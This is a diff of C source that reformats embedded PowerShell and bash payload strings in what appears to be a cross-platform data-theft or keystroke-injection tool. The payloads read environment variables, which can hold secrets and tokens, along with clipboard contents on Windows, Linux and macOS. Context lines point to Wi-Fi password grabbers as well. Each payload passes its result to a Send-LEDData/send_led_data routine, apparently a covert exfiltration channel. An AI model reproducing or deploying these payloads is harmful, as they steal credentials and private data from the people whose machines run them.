@@ -133,12 +133,11 @@ static const char* ps_wifi_passwords =
     "Send-LEDData $result\r\n";
 
 /* Env Vars - Windows */
-static const char* ps_env_vars =
-    "$result = ''\r\n"
-    "Get-ChildItem Env: | ForEach-Object {\r\n"
-    "  $result += \"$($_.Name)=$($_.Value)`n\"\r\n"
-    "}\r\n"
-    "Send-LEDData $result\r\n";
+static const char* ps_env_vars = "$result = ''\r\n"
+                                 "Get-ChildItem Env: | ForEach-Object {\r\n"
+                                 "  $result += \"$($_.Name)=$($_.Value)`n\"\r\n"
+                                 "}\r\n"
+                                 "Send-LEDData $result\r\n";
 
 /* Clipboard - Windows */
 static const char* ps_clipboard =
@@ -182,17 +181,15 @@ static const char* bash_wifi_passwords =
     "send_led_data \"$(echo -e \"$result\")\"\r\n";
 
 /* Env Vars - Linux */
-static const char* bash_env_vars =
-    "result=$(env 2>/dev/null)\r\n"
-    "if [ -z \"$result\" ]; then result='[no env vars]'; fi\r\n"
-    "send_led_data \"$result\"\r\n";
+static const char* bash_env_vars = "result=$(env 2>/dev/null)\r\n"
+                                   "if [ -z \"$result\" ]; then result='[no env vars]'; fi\r\n"
+                                   "send_led_data \"$result\"\r\n";
 
 /* Clipboard - Linux */
-static const char* bash_clipboard =
-    "result=$(xclip -selection clipboard -o 2>/dev/null || "
-    "xsel --clipboard --output 2>/dev/null || "
-    "echo '[clipboard unavailable]')\r\n"
-    "send_led_data \"$result\"\r\n";
+static const char* bash_clipboard = "result=$(xclip -selection clipboard -o 2>/dev/null || "
+                                    "xsel --clipboard --output 2>/dev/null || "
+                                    "echo '[clipboard unavailable]')\r\n"
+                                    "send_led_data \"$result\"\r\n";
 
 /* System Info - Linux */
 static const char* bash_sysinfo =
@@ -233,16 +230,14 @@ static const char* mac_wifi_passwords =
     "send_led_data \"$(echo -e \"$result\")\"\r\n";
 
 /* Env Vars - Mac */
-static const char* mac_env_vars =
-    "result=$(env 2>/dev/null)\r\n"
-    "if [ -z \"$result\" ]; then result='[no env vars]'; fi\r\n"
-    "send_led_data \"$result\"\r\n";
+static const char* mac_env_vars = "result=$(env 2>/dev/null)\r\n"
+                                  "if [ -z \"$result\" ]; then result='[no env vars]'; fi\r\n"
+                                  "send_led_data \"$result\"\r\n";
 
 /* Clipboard - Mac */
-static const char* mac_clipboard =
-    "result=$(pbpaste 2>/dev/null)\r\n"
-    "if [ -z \"$result\" ]; then result='[empty clipboard]'; fi\r\n"
-    "send_led_data \"$result\"\r\n";
+static const char* mac_clipboard = "result=$(pbpaste 2>/dev/null)\r\n"
+                                   "if [ -z \"$result\" ]; then result='[empty clipboard]'; fi\r\n"
+                                   "send_led_data \"$result\"\r\n";
 
 /* System Info - Mac */
 static const char* mac_sysinfo =
